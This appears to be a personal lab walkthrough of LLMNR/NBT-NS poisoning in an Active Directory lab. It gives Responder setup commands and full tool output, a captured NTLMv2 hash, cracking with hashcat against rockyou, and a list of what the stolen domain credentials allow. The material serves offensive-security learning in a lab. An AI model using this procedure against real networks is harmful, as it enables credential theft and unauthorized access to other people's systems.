## LLMNR poisoning ##

When a domain user typos on a file search or searches for a file that does not exist then theres a broadcast served to the entire local network asking: "hey who is X?". usualy DNS answers and if the file does not exist in the DNS server then LLMNR/NBT-NS gets triggered and now any machine on the network can answer the question.

The attack:
since it's a broadcast, any machine can answer, including your Kali box, lying "yes, that's me." Victim then sends creds (as an NTLM hash) straight to you.

before running check if responder is installed. 
if yes- good.
if not- download it.

now lets set up responder: 
Responder needs to bind to specific ports (UDP 137, 5355, etc). One common issue: Kali's own systemd-resolved service can already be holding port 53/5355.

so check:
```bash
sudo ss -tulnp | grep -E '53|5355'
```

to ensure the ports are not used by the system you need to get no output, like this:
┌──(kali㉿kali)-[~]
└─$ sudo ss -tulnp | grep -E '53|5355'
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ 

Empty output = good, nothing's holding those ports. Responder can bind clean.

Now check what network interface does your Kali use to reach the lab network:

```bash
ip a
```

Use yours, for me its eth0, IP 192.168.56.104, same lab subnet as the DC (192.168.56.x).

Now run Responder listening on that interface:

```bash
sudo responder -I eth0
```

Output needs to look like this:

┌──(kali㉿kali)-[~]
└─$ sudo responder -I eth0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.56.104]
    Responder IPv6             [fe80::bf09:3855:7b9b:4aab]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-NDB8FSFKI10]
    Responder Domain Name      [VTEF.LOCAL]
    Responder DCE-RPC Port     [47296]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                                                 

finishing with:
"[+] Listening for events..."                                                                                 

Now go on a domain user accout and in the file explorer press WIN + L to reach the address bar. 
than trigger a lookup failure. type a fake share path that doesn't exist, like \\filesharewrong\test

after that- look at responder and search for yelow text looking like this: 
[WebDAV] NTLMv2 Client   : fe80::f769:8ff7:498e:b0b9
[WebDAV] NTLMv2 Username : AD-LAB\Sima Arusi
[WebDAV] NTLMv2 Hash     : Sima Arusi::AD-LAB:cd2585eff3a711f5:AC46A2464B31F94239445DAD8D1E9DCB:01010000000000007F65AED16A36DD01AB6C3CBA096345200000000002000800310047003900370001001E00570049004E002D00430039004800310053004A005A0036004B00410058000400140031004700390037002E004C004F00430041004C0003003400570049004E002D00430039004800310053004A005A0036004B00410058002E0031004700390037002E004C004F00430041004C000500140031004700390037002E004C004F00430041004C000800300030000000000000000000000000200000B633B89BA14132A4B87E3A75DE04DF61909552DB2586D6FD637A5F2CE758C7B50A001000000000000000000000000000000000000900320048005400540050002F00660069006C00650073006800610072006500770072006F006E0067002E006C006F00630061006C000000000000000000  

if you got until here then you successfuly just captured the domain user's NTLMv2 hash.

now save that hash to a file to crack it with hashcat:
```bash
echo "Sima Arusi::AD-LAB:cd258566ff3a711f5:AC46A246456B31F94239445DAD8D1E9DCB:01010000000000007F65AED16A36DD01AB6C3CB456A0963452000000000020008003100456447003900370001001E00570049004E002D00430039004800310053004A005A0036004B0041005800040045140031004700390037002E004C004F0046430646041004C00030464503400570049004E002D004304565039004800310053004A005A0036004B00410058002E0031004700390037002E004C004F00430041004C000500140031004700390037002E004C004F00430041004C0008003000300000000064560000000000000000200000B633B89BA14132465A4B87E3A75DE04DF6194569552DB2586D6FD637A5F2CE758C7B50A001000000000000000000000000000000000000900320048005400540050002F00660069006C00656505640730068006100764246006500770072006F00456E0067002E006C006F00630061456006C000000000000000000" > sima_hash.txt
```
----------------------
ITS NOT MY ACTUAL HASH... 
----------------------

now crack it with hashcat:
```bash
hashcat -m 5600 sima_hash.txt /usr/share/wordlists/rockyou.txt
```

wait for it to finish and check status:
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 8745HX with Radeon Graphics, 1475/2950 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (2320 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344393
* Bytes.....: 139921516
* Keyspace..: 14344386
* Runtime...: 0 secs

SIMA ARUSI::AD-LAB:cd2585eff3a711f5:ac46a2464b31f94239445dad8d1e9dcb:01010000000000007f65aed16a36dd01ab6c3cba096345200000000002000800310047003900370001001e00570049004e002d00430039004800310053004a005a0036004b00410058000400140031004700390037002e004c004f00430041004c0003003400570049004e002d00430039004800310053004a005a0036004b00410058002e0031004700390037002e004c004f00430041004c000500140031004700390037002e004c004f00430041004c000800300030000000000000000000000000200000b633b89ba14132a4b87e3a75de04df61909552db2586d6fd637a5f2ce758c7b50a001000000000000000000000000000000000000900320048005400540050002f00660069006c00650073006800610072006500770072006f006e0067002e006c006f00630061006c000000000000000000:domainuserpasswordrighthere <- RIGHT HERE
                                                          
Session..........: hashcat
Status...........: Cracked <- RIGHT HERE
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: some domain userI::AD-LAB:cd2585234eff3a723411f5:ac46a2323442464b31f94...0002342000
Time.Started.....: Thu Aug 27 17:38:10 2026 (0 secs)
Time.Estimated...: Thu Aug 27 17:38:10 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   671.5 kH/s (1.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344386 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344386 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> 234234qu234e3423423en34
Hardware.Mon.#01.: Util: 31%

Started: Thu Aug 27 17:38:10 2026
Stopped: Thu Aug 27 17:38:11 2026

after cracking:
You now have valid domain creds for a domain user.

now you can:
1: Log into any domain-joined machine (locally, if allowed)
2: Browse the AD directory (that's how BloodHound worked without admin rights — remember?)
3: Read most shares that don't restrict by group
4: Send authenticated requests to services expecting a domain login

END ATTACK.